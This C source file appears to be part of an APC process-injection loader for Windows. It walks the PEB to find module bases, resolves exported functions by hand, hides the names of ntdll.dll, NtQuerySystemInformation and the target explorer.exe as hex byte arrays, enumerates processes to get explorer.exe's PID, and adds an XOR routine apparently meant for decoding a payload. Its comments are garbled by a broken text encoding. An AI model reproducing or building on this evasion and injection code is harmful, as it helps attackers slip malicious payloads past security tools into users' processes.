#include "APCInject.h"
#include <stdio.h>
#include <TlHelp32.h>
#include <stdlib.h>
#include <string.h>
#include "struct.h"

HMODULE WINAPI GetModuleBase(LPCWSTR lModuleName) {

	// ��ȡ���̻����� PEB ��ƫ����
#ifdef _M_IX86 
	PEB* peb = (PEB*)__readfsdword(0x30);
#else
	PEB* peb = (PEB*)__readgsqword(0x60);
#endif

	// ���غ�������ַ
	if (lModuleName == NULL)
		return (HMODULE)(peb->ImageBaseAddress);

	PEB_LDR_DATA* Ldr = peb->Ldr;
	LIST_ENTRY* ModuleList = NULL;

	ModuleList = &Ldr->InMemoryOrderModuleList;
	LIST_ENTRY* pStartListEntry = ModuleList->Flink;

	// ��������
	for (LIST_ENTRY* pListEntry = pStartListEntry;pListEntry != ModuleList;pListEntry = pListEntry->Flink) 
	{
		// ��ȡ��ǰ LDR_DATA_TABLE_ENTRY
		LDR_DATA_TABLE_ENTRY* pEntry = (LDR_DATA_TABLE_ENTRY*)((BYTE*)pListEntry - sizeof(LIST_ENTRY));

		// ��ģ��������ͬ���򷵻ظ�ģ��Ļ���ַ
		if (strcmp((const char*)pEntry->BaseDllName.Buffer, (const char*)lModuleName) == 0)
			return (HMODULE)pEntry->DllBase;
	}
	return NULL;
}

FARPROC WINAPI GetFuncAddress(HMODULE hMod, char* cFunName) {
	char* cBaseAddress = (char*)hMod;
	// ����������
	IMAGE_DOS_HEADER* pDos = (IMAGE_DOS_HEADER*)cBaseAddress;
	IMAGE_NT_HEADERS* pNt = (IMAGE_NT_HEADERS*)(cBaseAddress + pDos->e_lfanew);
	IMAGE_OPTIONAL_HEADER* pOptionalHdr = &pNt->OptionalHeader;
	IMAGE_DATA_DIRECTORY* pExport = (IMAGE_DATA_DIRECTORY*)(&pOptionalHdr->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]);
	IMAGE_EXPORT_DIRECTORY* pExportAddress = (IMAGE_EXPORT_DIRECTORY*)(cBaseAddress + pExport->VirtualAddress);

	//������ַ��
	DWORD* pEAT = (DWORD*)(cBaseAddress + pExportAddress->AddressOfFunctions);
	//�������Ʊ�
	DWORD* pENT = (DWORD*)(cBaseAddress + pExportAddress->AddressOfNames);
	//������ű�
	WORD* pEOT = (WORD*)(cBaseAddress + pExportAddress->AddressOfNameOrdinals);

	//Ѱ�ҵĹ��ܵ�ַ
	void* FuncAddress = NULL;

	//ͨ���������Ʊ����
	for (DWORD i = 0; i < pExportAddress->NumberOfNames; i++) {
		char* cTmpFuncName = (char*)cBaseAddress + (DWORD_PTR)pENT[i];
		//�����ƽ�������
		if (strcmp(cFunName, cTmpFuncName) == 0) {
			//���������ַ = RVA + BaseAddr
			//ͨ����ű��ȡ��ַ
			FuncAddress = (FARPROC)(cBaseAddress + (DWORD_PTR)pEAT[pEOT[i]]);
			break;
		}
	}
	return (FARPROC)FuncAddress;
}

DWORD GetProcessID()
{
	WCHAR Nkgskq[] = { 0x6E, 0x74, 0x64, 0x6C, 0x6C, 0x2E, 0x64, 0x6C, 0x6C,  0x00 };//ntdll.dll
	char So2wbX[] = { 0x4E, 0x74, 0x51, 0x75, 0x65, 0x72, 0x79, 0x53, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x49, 0x6E, 0x66, 0x6F, 0x72, 0x6D, 0x61, 0x74, 0x69, 0x6F, 0x6E,  0x00 };//NtQuerySystemInformation
	//ע��Ľ�����
	WCHAR wKRmhd[] = { 0x65, 0x78, 0x70, 0x6C, 0x6F, 0x72, 0x65, 0x72, 0x2E, 0x65, 0x78, 0x65,  0x00 };//explorer.exe
	ULONG ProcessId = 0;
	NewNtQuerySystemInformation enumProcess = (NewNtQuerySystemInformation)GetFuncAddress(GetModuleBase(Nkgskq), So2wbX);

	// �����㹻��Ļ�����
	ULONG size = 1 << 18;
	void* buffer = nullptr;

	for (;;) {
		buffer = realloc(buffer, size);
		if (!buffer)
			return 1;

		ULONG needed;
		//ö�ٽ���
		NTSTATUS status = enumProcess(SystemExtendedProcessInformation, buffer, size, &needed);
		if (status == 0)
			break;

		if (status == 0xC0000004) {
			size = needed + (1 << 12);
			continue;
		}
		return status;
	}

	auto p = (SYSTEM_PROCESS_INFORMATION*)buffer;
	for (;;) {
		if (!lstrcmpiW(p->ImageName.Buffer, wKRmhd)) {
			//Ψһ���� ID
			ProcessId = HandleToULong(p->UniqueProcessId);
			break;
		}
		if (p->NextEntryOffset == 0)	// ö�ٽ���
			break;
		p = (SYSTEM_PROCESS_INFORMATION*)((BYTE*)p + p->NextEntryOffset);
	}
	free(buffer);
	//���ر�ע����̵�PID
	return ProcessId;
}

//������
void XOR(char* data, size_t data_len,char* key, size_t key_len) {
	int j;
	j = 0;
	for (int i = 0; i < data_len; i++) {
		if (j == key_len - 1) j = 0;
		data[i] = data[i] ^ key[j];
		j++;
	}
}